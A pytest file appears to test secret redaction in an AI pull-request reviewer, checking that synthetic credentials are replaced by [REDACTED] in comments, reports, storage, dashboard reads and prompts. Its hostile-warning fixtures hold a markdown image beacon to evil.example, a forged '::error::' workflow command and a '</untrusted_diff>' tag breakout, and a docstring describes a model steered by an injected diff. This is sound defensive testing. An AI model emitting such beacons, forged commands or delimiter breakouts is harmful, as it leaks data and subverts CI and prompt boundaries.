"""V4-E08-T05 · the output redaction chokepoint.

The Batch-4A audit (finding P1-1) confirmed that finding
``title``/``explanation``/``suggestion`` and the review summary were
redacted nowhere: every sink consumed raw engine text. These tests drive
the REAL pipeline (orchestrator run with real dedup/lifecycle/anchoring,
the ``cli._post_review`` posting path, the reporter artifacts, storage
rows, the dashboard upload) and assert on the bytes each sink emits: a
synthetic credential must be *absent* — with ``[REDACTED]`` visibly in
its place — everywhere, never merely "the helper works in isolation".

Also pins, per the ticket's test requirements:

* deduplicated/merged findings stay redacted and every merged list stays
  bounded;
* evidence and provenance records never enter provider prompts;
* the frozen V3 report contract survives redaction untouched.

And the security follow-up batch (audit P2-1 / P3-2 / P3-3):

* legacy previous findings (stored by pre-chokepoint releases) are
  re-redacted at every load boundary before lifecycle or any sink —
  comments, PATCH sync, sync warnings, report artifacts, dashboard reads
  and re-persisted rows;
* malformed model-controlled fields (nested suggestion, out-of-set
  category/confidence, non-string rule_id) are normalized at the
  deserialization boundary;
* configured credentials get the same redaction layer in evidence
  locators/summaries, with content hashes kept consistent with the
  stored text.

Synthetic credentials only: pattern-shaped strings that
``redact_secrets`` matches, never real secrets, never in fixtures.
"""
from __future__ import annotations

import hashlib
import json
import sys
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import Mock

import pytest

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

import httpx
from ai_pr_reviewer import cli, orchestrator as orch, reporter
from ai_pr_reviewer.ai.claude import ClaudeProvider
from ai_pr_reviewer.ai.gemini import GeminiProvider
from ai_pr_reviewer.ai.openai import OpenAIProvider
from ai_pr_reviewer.config import Config
from ai_pr_reviewer.context import build_context
from ai_pr_reviewer.diff_parser import parse_unified_diff
from ai_pr_reviewer.findings import deduplicate
from ai_pr_reviewer.github_client import GitHubError
from ai_pr_reviewer.model_router import reset_circuits
from ai_pr_reviewer.models import (
    MAX_EVIDENCE_PER_FINDING,
    MAX_PROVENANCE_SOURCES,
    AnalysisOutcome,
    EvidenceRecord,
    Finding,
    PRContext,
    ProvenanceSource,
)
from ai_pr_reviewer.security import redact_secrets
from test_report_schema import (  # frozen V3 contract, single source of truth
    REQUIRED_FINDING_KEYS,
    REQUIRED_REPORT_KEYS,
)

# --- synthetic credentials (pattern-shaped; never real) ----------------------
API_KEY = "sk-aB3dE5fG7hI9jK1lM3nP5qR"   # api-sk-key pattern (>=20-char tail)
PW = "hunter2supersecretvalue"           # key-value-secret pattern (>=8 tail)
# A *configured* credential (V4-E08-T05 follow-up): deliberately matches NO
# redact_secrets pattern, so only the exact-match scrub layer can remove it.
CONFIGURED_KEY = "cfg-cred-x9K2mQ7pL4nR8sT3uV6w"


def _diff(path: str, added_line: str) -> str:
    """One added line at new-file line 2, context lines around it."""
    return (f"diff --git a/{path} b/{path}\n--- a/{path}\n+++ b/{path}\n"
            f"@@ -1,2 +1,3 @@\n ctx\n+{added_line}\n ctx2\n")


# The changed line itself carries the credential: the pipeline quotes it
# into diff-hunk evidence, so the evidence sink is exercised too.
DIFF = _diff("app/service.py", f'TOKEN = "{API_KEY}"')


def _payload(**over):
    """One provider finding, credential-laden in every user-visible field."""
    base = {
        "file": "app/service.py", "line": 2, "severity": "high",
        "category": "security",
        "title": f"Hardcoded api_token {API_KEY} in service.py",
        "explanation": (f'The diff hardcodes a credential: password = "{PW}" '
                        f"and {API_KEY} sit in plain text."),
        "suggestion": f"Remove the line that assigns {API_KEY}.",
        "confidence": "high", "rule_id": "sec/hardcoded-credential",
    }
    base.update(over)
    return base


# Second rendering of the same issue: quote-style-only difference means
# same occurrence key, different v1 fingerprint => cross-engine merge path.
_DUP_PAYLOAD = _payload(
    title=f'Hardcoded api_token {API_KEY} in "service.py"',
    severity="medium",
)

_SUMMARY = (f'Reviewed the change. password = "{PW}" is referenced '
            f"({API_KEY}).")


class _RecordingStorage:
    """Duck-typed storage double: records exactly what the run persists and
    serves whatever "previously stored" findings a test seeds (rows written
    by a pre-chokepoint release, in the legacy-redaction tests)."""

    def __init__(self, previous=()):
        self.saved_rows: list[list[dict]] = []
        self.sha_calls: list[tuple] = []
        self._previous = list(previous)

    def get_last_reviewed_sha(self, repo, pr_number):
        return None

    def get_previous_findings(self, repo, pr_number):
        return list(self._previous)

    def save_findings(self, review_id, findings):
        self.saved_rows.append(list(findings))

    def set_last_reviewed_sha(self, repo, pr_number, sha, base_sha):
        self.sha_calls.append((repo, pr_number, sha, base_sha))


class _FakeEngine:
    """Provider double: model output exactly as a provider would emit it
    (parsed through ``from_untrusted_dict``), credentials and all."""

    backend = "claude"

    def __init__(self, payloads, summary):
        self._payloads = payloads
        self._summary = summary

    def analyze(self, context):
        return AnalysisOutcome(
            findings=[Finding.from_untrusted_dict(dict(p))
                      for p in self._payloads],
            summary=self._summary, mode="claude", model="claude-test",
            engine="claude", fallback_used=False, batch_count=1,
        )


class _PostedGH:
    """Records the exact bytes ``cli._post_review`` would send to GitHub."""

    def __init__(self):
        self.reviews: list[tuple[str, list[dict]]] = []

    def post_review(self, number, commit_id, body, comments):
        self.reviews.append((body, list(comments)))
        return {"ok": True}


def _run_pipeline(monkeypatch, *, payloads, summary, cfg_extra=None,
                  previous=(), diff=None):
    """One full orchestrator run: real dedup/lifecycle/validation/report,
    engine and context seams faked, storage recording."""
    reset_circuits()                       # deterministic breaker state
    cfg = Config(repo="acme/api", pr_number=7, severity_threshold="low",
                 max_comments=20, **(cfg_extra or {}))
    storage = _RecordingStorage(previous=previous)
    engine = _FakeEngine(payloads, summary)

    def _build_context(pr, files, cfg_, storage=None, gh=None):
        return SimpleNamespace(pr=pr, files=files, previous_findings=[])

    monkeypatch.setattr(orch, "build_context", _build_context)
    monkeypatch.setattr(orch, "get_provider", lambda cfg_, context: engine)

    pr = PRContext(repo="acme/api", pr_number=7, head_sha="h" * 40)
    result = orch.ReviewOrchestrator(
        cfg, None, storage, pr=pr, diff_text=diff or DIFF).run()
    return cfg, result, storage


# ---------------------------------------------------------------------------
# 1 · every output sink, asserted on the emitted bytes
# ---------------------------------------------------------------------------

def test_secrets_never_reach_any_output_sink(monkeypatch, tmp_path):
    cfg, result, storage = _run_pipeline(
        monkeypatch, payloads=[_payload(), _DUP_PAYLOAD], summary=_SUMMARY)

    def _assert_clean(blob: str, where: str) -> None:
        assert API_KEY not in blob, f"raw secret leaked into {where}"
        assert PW not in blob, f"raw secret leaked into {where}"

    # -- pipeline state: merged once, redacted, bounded (requirement 2)
    assert len(result.findings) == 1, "the two renderings must merge"
    finding = result.findings[0]
    for text in (finding.title, finding.explanation,
                 finding.suggestion or "", result.summary or ""):
        assert API_KEY not in text
        assert PW not in text
    assert "[REDACTED]" in finding.title          # redacted, not merely absent
    assert "[REDACTED]" in finding.explanation
    assert "[REDACTED]" in (result.summary or "")
    assert len(finding.evidence) <= MAX_EVIDENCE_PER_FINDING
    assert len(finding.provenance_sources) <= MAX_PROVENANCE_SOURCES
    assert len(finding.merged_fingerprints) <= 16
    # diff-hunk evidence quoted the secret-bearing added line -> redacted
    assert finding.evidence, "pipeline must attach diff-hunk evidence"
    assert API_KEY not in finding.evidence[0].summary
    assert "[REDACTED]" in finding.evidence[0].summary

    # -- sink: GitHub inline comment + summary comment (the real posting path)
    gh = _PostedGH()
    count, _resp = cli._post_review(gh, cfg, result, [finding])
    assert count == 1 and gh.reviews, "the review must be posted"
    body, comments = gh.reviews[0]
    blobs = [body] + [c["body"] for c in comments]
    assert comments and all(c["body"] for c in comments)
    for blob in blobs:
        _assert_clean(blob, "the posted GitHub review")
    assert any("[REDACTED]" in blob for blob in blobs)

    # -- sink: JSON report artifact (in memory and on disk)
    report = reporter.finalize_report(result)
    _assert_clean(json.dumps(report), "the JSON report")
    written = reporter.write_report(str(tmp_path / "review-report.json"),
                                    report)
    _assert_clean(Path(written).read_text(encoding="utf-8"),
                  "the report file on disk")

    # -- sink: GitHub step summary
    step = tmp_path / "step_summary.md"
    monkeypatch.setenv("GITHUB_STEP_SUMMARY", str(step))
    reporter.write_step_summary(result)
    _assert_clean(step.read_text(encoding="utf-8"), "the GitHub step summary")

    # -- sink: dashboard upload payload
    uploaded: dict = {}

    class _Resp:
        status_code = 200
        text = ""

        def json(self):
            return {"id": "report-1"}

    def _post(url, json=None, headers=None, timeout=None):
        uploaded["payload"] = json
        return _Resp()

    monkeypatch.setattr(httpx, "post", _post)
    ok, msg = reporter.push_to_dashboard("http://dashboard.local",
                                         "synthetic-token", report)
    assert ok, msg
    assert uploaded.get("payload") is not None, "upload must carry the report"
    _assert_clean(json.dumps(uploaded["payload"]), "the dashboard upload")

    # -- sink: persisted finding rows
    assert storage.saved_rows, "the run must persist its findings"
    _assert_clean(json.dumps(storage.saved_rows),
                  "the persisted finding rows")


# ---------------------------------------------------------------------------
# 2 · dedup/merge keeps every list bounded
# ---------------------------------------------------------------------------

def test_merge_caps_evidence_sources_and_fingerprint_trail():
    """Unit-level: a merge over the cap is truncated at the contract bound
    (the e2e above proves the merged *text* stays redacted)."""
    winner = Finding(file="app/client.py", line=5, severity="high",
                     category="security",
                     title="Hardcoded api_token in client",
                     explanation="safe text")
    winner.evidence = tuple(
        EvidenceRecord.create(kind="rule_ref", locator=f"rule:W{i}",
                              summary=f"winner evidence {i}")
        for i in range(MAX_EVIDENCE_PER_FINDING))
    winner.provenance_sources = tuple(
        ProvenanceSource(engine=f"engine-w{i}", model="m", origin="ai")
        for i in range(MAX_PROVENANCE_SOURCES))
    winner.merged_fingerprints = tuple(f"fpw{i:02d}" for i in range(14))

    loser = Finding(file="app/client.py", line=5, severity="medium",
                    category="security",
                    title='Hardcoded api_token in "client"',
                    explanation="also safe")
    loser.evidence = tuple(
        EvidenceRecord.create(kind="diff_hunk",
                              locator=f"app/client.py:{i}-{i}",
                              summary=f"loser evidence {i}")
        for i in range(MAX_EVIDENCE_PER_FINDING))
    loser.provenance_sources = tuple(
        ProvenanceSource(engine=f"engine-l{i}", model="m", origin="ai")
        for i in range(MAX_PROVENANCE_SOURCES))
    loser.merged_fingerprints = tuple(f"fpl{i:02d}" for i in range(8))

    merged = deduplicate([winner, loser])
    assert len(merged) == 1, "quote-style twins must merge"
    f = merged[0]
    assert f.explanation == "safe text"          # winner's content preserved
    # 16 candidates -> capped at 8
    assert len(f.evidence) == MAX_EVIDENCE_PER_FINDING
    # 16 candidates -> capped at 8
    assert len(f.provenance_sources) == MAX_PROVENANCE_SOURCES
    # 14 + loser's v1 fingerprint + 8 -> capped at 16, audit trail intact
    assert len(f.merged_fingerprints) == 16


# ---------------------------------------------------------------------------
# 6 · evidence and provenance never enter provider prompts
# ---------------------------------------------------------------------------

def _file_diff():
    text = ("--- a/app/service.py\n+++ b/app/service.py\n"
            "@@ -1,1 +1,2 @@\n def run():\n+    return 1\n")
    return parse_unified_diff(text)[0]


def _ok_envelope(kind: str) -> dict:
    body = json.dumps({"summary": "fine", "findings": [], "warnings": []})
    if kind == "claude":
        return {"usage": {"input_tokens": 1, "output_tokens": 1},
                "content": [{"type": "text", "text": body}]}
    if kind == "openai":
        return {"usage": {"prompt_tokens": 1, "completion_tokens": 1},
                "choices": [{"message": {"content": body}}]}
    return {"candidates": [{"content": {"parts": [{"text": body}]}}]}


class _ProviderResponse:
    def __init__(self, payload: dict):
        self.status_code = 200
        self._payload = payload

    def json(self) -> dict:
        return self._payload

    def raise_for_status(self) -> None:
        return None


def _provider(kind: str):
    if kind == "claude":
        return ClaudeProvider(api_key="sk-ant-test")
    if kind == "openai":
        return OpenAIProvider(api_key="sk-test", model="gpt-test")
    return GeminiProvider(api_key="AIza-test", model="gemini-test")


def _sent_prompt(provider, kind: str) -> str:
    payload = provider._client.post.call_args.kwargs["json"]
    if kind == "claude":
        return payload["messages"][0]["content"]
    if kind == "openai":
        return payload["messages"][1]["content"]
    return payload["contents"][0]["parts"][0]["text"]


@pytest.mark.parametrize("kind", ["claude", "openai", "gemini"])
def test_evidence_and_provenance_never_reach_provider_prompts(kind):
    """A stored finding carrying evidence + provenance rides on the context;
    none of its records may be serialized into the prompt that leaves the
    box (AGENTS.md: evidence/provenance stay out of provider prompts)."""
    provider = _provider(kind)
    carry_over = Finding(
        file="app/service.py", line=2, severity="high",
        title="carry-over from a previous review",
        explanation="stored by an earlier run",
        evidence=(EvidenceRecord.create(
            kind="diff_hunk", locator="leak/LOCATOR-LEAK.txt:1-2",
            summary="EVIDENCE-LEAK-MARKER quoted payload"),),
        provenance_sources=(ProvenanceSource(engine="PROVENANCE-LEAK-MARKER",
                                             model="m", origin="ai"),),
    )
    context = SimpleNamespace(
        files=[_file_diff()], focus_areas=[], memory_notes=[],
        previous_findings=[carry_over],
    )
    provider._client.post = Mock(
        return_value=_ProviderResponse(_ok_envelope(kind)))

    outcome = provider.analyze(context)
    assert outcome is not None

    prompt = _sent_prompt(provider, kind)
    assert "<untrusted_diff" in prompt            # sanity: prompt was built
    for marker in ("EVIDENCE-LEAK-MARKER", "LOCATOR-LEAK",
                   "PROVENANCE-LEAK-MARKER"):
        assert marker not in prompt, f"{marker} reached the provider prompt"
    assert "provenance_sources" not in prompt


# ---------------------------------------------------------------------------
# 7 · the frozen V3 report/action contract survives redaction
# ---------------------------------------------------------------------------

def test_redaction_preserves_the_v3_report_contract(monkeypatch):
    _cfg, result, _storage = _run_pipeline(
        monkeypatch, payloads=[_payload(), _DUP_PAYLOAD], summary=_SUMMARY)
    report = reporter.finalize_report(result, report_id="e08-t05-contract")

    # top-level + finding-row contracts frozen by test_report_schema
    assert REQUIRED_REPORT_KEYS <= set(report)
    assert report["findings"], "the redacted run still reports its finding"
    assert len(report["findings"]) == 1
    for row in report["findings"]:
        assert REQUIRED_FINDING_KEYS <= set(row)
        assert isinstance(row["title"], str)
        assert isinstance(row["explanation"], str)
        assert row["suggestion"] is None or isinstance(row["suggestion"], str)
        assert row["line"] is None or isinstance(row["line"], int)
        assert isinstance(row["severity"], str)
        assert isinstance(row["evidence"], list)
        assert isinstance(row["provenance_sources"], list)
    # JSON round-trippable, byte-identical (artifact contract)
    assert json.loads(json.dumps(report)) == report


# ---------------------------------------------------------------------------
# 8 · legacy previous findings (audit P2-1 follow-up): rows written by
#     pre-chokepoint releases are re-redacted at every load boundary
# ---------------------------------------------------------------------------

# A benign current-run finding (different fingerprint than the legacy row,
# so the lifecycle synthesizes the legacy row as "resolved").
_CLEAN_PAYLOAD = {
    "file": "app/service.py", "line": 2, "severity": "low",
    "category": "style", "title": "Unused import os",
    "explanation": "os is imported but never used in this module.",
    "suggestion": "Drop the import.", "confidence": "low",
    "rule_id": "style/unused-import",
}


def _legacy_finding(**over):
    """A finding as a PRE-chokepoint release stored it: raw credential-
    shaped text in every user-visible field (the audit's P2-1 population)."""
    d = {
        "file": "app/service.py", "line": 2, "severity": "high",
        "category": "security", "state": "active",
        "fingerprint": "legacy-tainted-fp",
        "github_comment_id": 4242,
        "title": f"Hardcoded api_token {API_KEY} in service.py",
        "explanation": f'The diff hardcodes password = "{PW}" with {API_KEY}.',
        "suggestion": f"Remove the line that assigns {API_KEY}.",
    }
    d.update(over)
    return Finding.from_dict(d)


class _SyncGH:
    """Worst-case comment sync: PATCHes are recorded, then the comment is
    'gone' (404) — github_sync quotes finding titles in that warning."""

    def __init__(self):
        self.review_body: str = ""
        self.patched: list[str] = []

    def post_review(self, number, commit_id, body, comments):
        self.review_body = body
        return {"ok": True}

    def update_review_comment(self, comment_id, body):
        self.patched.append(body)
        raise GitHubError("gone", status_code=404)


def _assert_no_secret(blob: str, where: str) -> None:
    for secret in (API_KEY, PW, CONFIGURED_KEY):
        assert secret not in blob, f"raw secret leaked into {where}"


def test_legacy_previous_findings_never_reach_any_sink(monkeypatch):
    """The full real lifecycle/output path with a tainted stored row: the
    lifecycle synthesizes it as resolved, and no sink — report JSON,
    posted summary, comment sync PATCH, sync warnings, re-persisted rows,
    evidence — may show the raw text."""
    legacy = _legacy_finding()
    # Evidence as a pre-chokepoint release stored it: the configured
    # credential (no pattern matches it) survived to storage.
    legacy.evidence = (
        EvidenceRecord.create(
            kind="diff_hunk", locator="app/service.py:2-2",
            summary=f'TOKEN = "{API_KEY}"  # cfg: {CONFIGURED_KEY}'),
        EvidenceRecord.create(
            kind="rule_ref", locator="rule:SEC001",
            summary="benign evidence note"),
    )
    clean_hash = legacy.evidence[1].content_hash

    cfg, result, storage = _run_pipeline(
        monkeypatch, payloads=[_CLEAN_PAYLOAD], summary="benign summary",
        cfg_extra={"openai_api_key": CONFIGURED_KEY}, previous=[legacy])

    # -- lifecycle: the legacy row came back as a resolved finding, redacted
    closed = [f for f in result.findings if getattr(f, "github_comment_id", None) == 4242]
    assert len(closed) == 1 and closed[0].state == "resolved"
    for text in (closed[0].title, closed[0].explanation,
                 closed[0].suggestion or ""):
        _assert_no_secret(text, "the synthesized resolved finding")
    assert "[REDACTED]" in closed[0].title          # redacted, not merely absent

    # -- evidence: tainted record rewritten text+hash together; clean one untouched
    tainted_ev, clean_ev = closed[0].evidence
    _assert_no_secret(tainted_ev.summary, "legacy evidence summary")
    _assert_no_secret(tainted_ev.locator, "legacy evidence locator")
    assert tainted_ev.integrity_ok, "rewrite must keep hash and text consistent"
    assert clean_ev.content_hash == clean_hash      # untouched bytes preserved
    assert clean_ev.summary == "benign evidence note"

    # -- sink: JSON report artifact
    report = reporter.finalize_report(result, report_id="legacy")
    _assert_no_secret(json.dumps(report), "the JSON report")

    # -- sink: posted summary comment (resolved list renders the legacy title)
    md = reporter.build_summary_markdown(result)
    _assert_no_secret(md, "the summary markdown")
    assert any("✅" in line for line in md.splitlines())

    # -- sink: re-persisted finding rows
    assert storage.saved_rows, "the run must persist its findings"
    _assert_no_secret(json.dumps(storage.saved_rows), "the persisted rows")

    # -- sinks: comment sync PATCH body + sync warnings (real posting path)
    gh = _SyncGH()
    cli._post_and_sync(gh, cfg, storage, result,
                       reporter.open_findings(result.findings))
    _assert_no_secret(gh.review_body, "the posted review body")
    assert gh.patched, "the legacy finding's comment must be synced"
    for body in gh.patched:
        _assert_no_secret(body, "a comment-sync PATCH body")
        assert "[REDACTED]" in body                # marker + redacted title
    assert result.warnings, "the 404 sync failure must surface a warning"
    for w in result.warnings:
        _assert_no_secret(w, "a run warning")


def test_incremental_carry_over_of_redacted_previous_findings():
    """The incremental branch: findings in untouched files are carried over
    as still-active — their input is the load boundary's redacted output
    (run() composes _redact_previous_findings + _apply_lifecycle exactly
    like this)."""
    cfg = Config(repo="acme/api", pr_number=7,
                 openai_api_key=CONFIGURED_KEY)
    tainted = _legacy_finding()
    orch._redact_previous_findings([tainted], cfg)

    carried = orch.ReviewOrchestrator._apply_lifecycle(
        previous=[tainted], current=[], files=[], incremental=True,
        head_sha="h" * 40)

    assert len(carried) == 1
    assert carried[0].state == "active"
    for text in (carried[0].title, carried[0].explanation,
                 carried[0].suggestion or ""):
        _assert_no_secret(text, "the carried-over finding")


def test_context_loaded_previous_findings_are_redacted(tmp_path):
    """build_context's own load path (the fallback the orchestrator uses
    for storage backends without the previous-findings capability) must
    redact too — defense in depth at both load boundaries."""
    cfg = Config(openai_api_key=CONFIGURED_KEY)
    cfg.repo_root = str(tmp_path)          # no rules file here -> defaults

    class _Storage:
        def get_previous_findings(self, repo, pr_number):
            return [_legacy_finding()]

    ctx = build_context(PRContext(repo="acme/api", pr_number=7),
                        [_file_diff()], cfg, storage=_Storage())

    assert len(ctx.previous_findings) == 1
    loaded = ctx.previous_findings[0]
    for text in (loaded.title, loaded.explanation, loaded.suggestion or ""):
        _assert_no_secret(text, "the context-loaded previous finding")
    assert "[REDACTED]" in loaded.title


# ---------------------------------------------------------------------------
# 9 · model-controlled field validation (audit P3-2 follow-up): malformed
#     nested values are normalized at the deserialization boundary
# ---------------------------------------------------------------------------

def test_adversarial_model_fields_are_normalized_at_the_boundary():
    """A model (steerable via an injected diff) can emit nested junk and
    credential-shaped text in category/confidence/rule_id/suggestion — all
    rendered or serialized verbatim before this fix."""
    f = Finding.from_untrusted_dict(_payload(
        suggestion={"fix": f"delete {API_KEY}"},   # nested: dropped, never stringified
        category=f"password = {PW}",               # not in VALID_CATEGORIES
        confidence="PARANOID",                     # not in low|medium|high
        rule_id={"nested": API_KEY},               # not a string
    ))
    assert f.suggestion is None
    assert f.category == "bug"
    assert f.confidence == "medium"
    assert f.rule_id is None

    # contract-preserving coercions: valid values pass, numbers stringify
    g = Finding.from_untrusted_dict(_payload(
        rule_id=42, category="Security", confidence=" HIGH "))
    assert g.rule_id == "42"
    assert g.category == "security"
    # " HIGH " is not in the closed set (no strip on this field, matching
    # the severity reader) -> defaults, never a passthrough
    assert g.confidence == "medium"


def test_adversarial_payload_keeps_the_report_contract_and_sinks_clean(monkeypatch):
    """The same adversarial payload through the real pipeline: the report
    keeps the frozen key set and field types, and the credential-shaped
    category can no longer reach a comment body (it is rendered raw)."""
    bad = _payload(
        suggestion={"fix": f"delete {API_KEY}"},
        category=f"password = {PW}",
        confidence="PARANOID",
        rule_id={"nested": API_KEY},
    )
    cfg, result, storage = _run_pipeline(
        monkeypatch, payloads=[bad], summary="benign summary")

    report = reporter.finalize_report(result, report_id="adversarial")
    row = report["findings"][0]
    assert REQUIRED_FINDING_KEYS <= set(row)
    assert row["suggestion"] is None
    assert row["category"] == "bug"
    assert row["confidence"] == "medium"
    assert row["rule_id"] is None
    _assert_no_secret(json.dumps(report), "the adversarial report")

    gh = _PostedGH()
    cli._post_review(gh, cfg, result, [result.findings[0]])
    body, comments = gh.reviews[0]
    for blob in [body] + [c["body"] for c in comments]:
        _assert_no_secret(blob, "a comment built from the adversarial payload")


# ---------------------------------------------------------------------------
# 10 · evidence configured-credential coverage (audit P3-3 follow-up)
# ---------------------------------------------------------------------------

def test_create_scrub_layer_precedes_bounds_and_hash():
    """The caller-supplied scrub applies after pattern redaction and before
    bounds + hash, so content_hash always commits to the final stored text."""
    e = EvidenceRecord.create(
        kind="diff_hunk", locator="a.py:1-2",
        summary=f"password = {PW}  cfg={CONFIGURED_KEY}",
        scrub=lambda t: t.replace(CONFIGURED_KEY, "[REDACTED]"))
    _assert_no_secret(e.summary, "scrubbed evidence summary")
    assert "[REDACTED]" in e.summary
    assert e.integrity_ok
    assert e.content_hash == hashlib.sha256(
        e.summary.encode("utf-8")).hexdigest()[:16]


def test_chokepoint_scrubs_engine_attached_evidence():
    """The static engine attaches evidence at the engine (before the
    chokepoint); the chokepoint re-creates those records with the
    configured-credential layer — text and hash move together."""
    cfg = Config(openai_api_key=CONFIGURED_KEY)
    f = Finding(
        file="app/service.py", line=2, title="t", explanation="e",
        evidence=(EvidenceRecord.create(
            kind="rule_ref", locator=f"rule:SEC:{CONFIGURED_KEY}",
            summary=f"engine quoted {API_KEY} and {CONFIGURED_KEY}"),))
    outcome = AnalysisOutcome(
        findings=[f], summary="s", mode="static", model="static",
        engine="static", fallback_used=False, batch_count=1)

    orch._redact_engine_output(outcome, cfg)

    ev = f.evidence[0]
    _assert_no_secret(ev.locator, "engine evidence locator")
    _assert_no_secret(ev.summary, "engine evidence summary")
    assert ev.integrity_ok


def test_pipeline_diff_evidence_carries_no_configured_credential(monkeypatch):
    """The quoted diff line comes from the untrusted diff and can contain
    THIS run's configured credential (which matches no pattern — sanity
    checked below); diff-hunk evidence must come out scrubbed."""
    assert redact_secrets(f"note {CONFIGURED_KEY}") == f"note {CONFIGURED_KEY}"
    diff = _diff("app/service.py", f'TOKEN = "{CONFIGURED_KEY}"')

    cfg, result, storage = _run_pipeline(
        monkeypatch, payloads=[_CLEAN_PAYLOAD], summary="benign summary",
        cfg_extra={"openai_api_key": CONFIGURED_KEY}, diff=diff)

    f = result.findings[0]
    assert f.evidence, "the anchored finding must carry diff-hunk evidence"
    _assert_no_secret(f.evidence[0].summary, "pipeline evidence summary")
    assert f.evidence[0].integrity_ok

    report = reporter.finalize_report(result, report_id="evidence-scrub")
    _assert_no_secret(json.dumps(report), "the evidence-scrub report")
    _assert_no_secret(json.dumps(storage.saved_rows), "the evidence-scrub rows")


# ---------------------------------------------------------------------------
# 11 · dashboard reads (audit P2-1 tail): stored legacy rows are re-redacted
#     on the way out — same schema, clean bytes
# ---------------------------------------------------------------------------

def test_dashboard_reads_redact_legacy_tainted_rows(tmp_path, monkeypatch):
    """Seed the real dashboard storage with a pre-chokepoint tainted row,
    then read it back through the three GET endpoints that serve finding
    text: the report payload, the per-PR findings feed and the findings
    browser. Same keys/types out, no raw credential anywhere."""
    import dashboard.app as dashboard_app
    from dashboard.storage import JsonStorage
    from fastapi.testclient import TestClient

    from ai_pr_reviewer.storage_schema import format_review_id

    storage = JsonStorage(tmp_path / "reports", data_dir=tmp_path)
    storage.init()
    row = _legacy_finding().to_dict()
    storage.upsert({"id": "legacy-1",
                    "pr": {"repo": "acme/api", "number": 7},
                    "summary": f"reviewed; password = \"{PW}\"",
                    "findings": [row]})
    storage.save_findings(format_review_id("acme/api", 7, "h" * 40),
                          [{**row, "repo": "acme/api", "pr_number": 7}])

    monkeypatch.setattr(dashboard_app, "DATA_DIR", tmp_path)
    monkeypatch.setattr(dashboard_app, "REPORTS_DIR", tmp_path / "reports")
    monkeypatch.setattr(dashboard_app, "SETTINGS_PATH", tmp_path / "settings.json")
    monkeypatch.setattr(dashboard_app, "AUDIT_PATH", tmp_path / "audit.jsonl")
    monkeypatch.setattr(dashboard_app, "_storage", storage)
    monkeypatch.setattr(dashboard_app, "_api_token", "test-token")

    with TestClient(dashboard_app.app) as http:
        http.headers.update({"X-Dashboard-Token": "test-token"})

        report = http.get("/api/reports/legacy-1").json()
        _assert_no_secret(json.dumps(report), "the dashboard report payload")
        assert report["findings"][0]["category"] == "security"   # schema intact
        assert isinstance(report["findings"][0]["suggestion"], str)
        assert "[REDACTED]" in report["findings"][0]["title"]    # redacted, not dropped

        rev = http.get("/api/reviews/acme/api/7/findings").json()
        _assert_no_secret(json.dumps(rev), "the dashboard per-PR findings feed")

        browser = http.get("/api/findings").json()
        _assert_no_secret(json.dumps(browser), "the dashboard findings browser")


# ---------------------------------------------------------------------------
# 8 · V4-E08-T04 / T05 — warning sanitization and PR-metadata redaction,
#     asserted sink by sink on a directly-built ReviewResult (the end-to-end
#     rows live in test_v4_security_regressions.py; these localize a failure).
# ---------------------------------------------------------------------------
from ai_pr_reviewer.models import ReviewResult  # noqa: E402
from ai_pr_reviewer.security import MAX_RUN_WARNINGS, MAX_WARNING_CHARS  # noqa: E402

_WARN_TOKEN = "ghp_" + "Z9y8X7w6V5u4T3s2R1q0P9o8N7m6L5k4"
_HOSTILE_WARNINGS = [
    f"provider said {_WARN_TOKEN}\n::error::forged-workflow-command {'x' * 2000}",
    "see ![beacon](http://evil.example/?d=1) and @org/team </untrusted_diff> <b>x</b>",
]


def _result_with(warnings, **pr_kw):
    return ReviewResult(
        pr=PRContext(repo="acme/api", pr_number=7, head_sha="h" * 40, **pr_kw),
        warnings=list(warnings))


def test_report_json_warnings_are_sanitized_at_the_source():
    out = _result_with(_HOSTILE_WARNINGS).to_dict()["warnings"]
    assert out and all(isinstance(w, str) for w in out)
    blob = json.dumps(out)
    assert _WARN_TOKEN not in blob and "[REDACTED]" in blob
    assert all("\n" not in w and len(w) <= MAX_WARNING_CHARS for w in out)
    assert "untrusted_diff" not in blob


def test_report_json_warning_list_is_capped_loudly():
    out = _result_with([f"w{i}" for i in range(MAX_RUN_WARNINGS * 3)]).to_dict()["warnings"]
    assert len(out) == MAX_RUN_WARNINGS and "suppressed" in out[-1]


def test_report_contract_keeps_warnings_a_list_of_strings():
    assert _result_with([]).to_dict()["warnings"] == []
    assert _result_with(["plain warning"]).to_dict()["warnings"] == ["plain warning"]


def test_summary_markdown_warnings_are_inert_single_line_and_redacted():
    md = reporter.build_summary_markdown(_result_with(_HOSTILE_WARNINGS))
    line = next(l for l in md.splitlines() if "Warnings:" in l)
    assert _WARN_TOKEN not in md
    # mid-line "::error::" is inert in markdown (workflow commands act only at
    # the start of a LOG line — pinned by the console test below); what the
    # sink must guarantee is that the warning cannot start a new line.
    assert sum("forged-workflow-command" in l for l in md.splitlines()) == 1
    assert not any(l.lstrip("> ").startswith("::") for l in md.splitlines())
    assert "![beacon](" not in md and "@org/team" not in md and "<b>" not in md
    assert "</untrusted_diff>" not in md
    assert len(line) < MAX_RUN_WARNINGS * (MAX_WARNING_CHARS + 40)


def test_console_warning_lines_never_start_a_workflow_command(capsys):
    cli._print_console(_result_with(_HOSTILE_WARNINGS), "rid")
    out = capsys.readouterr().out
    assert _WARN_TOKEN not in out
    assert not any(l.startswith("::") for l in out.splitlines())
    assert all(l.startswith("[ai-pr-reviewer]") for l in out.splitlines() if l.strip())


def test_pr_metadata_is_redacted_in_report_and_console(capsys):
    tok = "sk-pP1rR2mM3eE4tT5aA6dD7aA8tB"
    res = _result_with([], pr_title=f"fix {tok}", author=tok, branch=f"feat/{tok}")
    pr = res.to_dict()["pr"]
    assert tok not in json.dumps(pr)
    assert all("[REDACTED]" in pr[k] for k in ("title", "author", "branch"))
    cli._print_console(res, "rid")
    assert tok not in capsys.readouterr().out
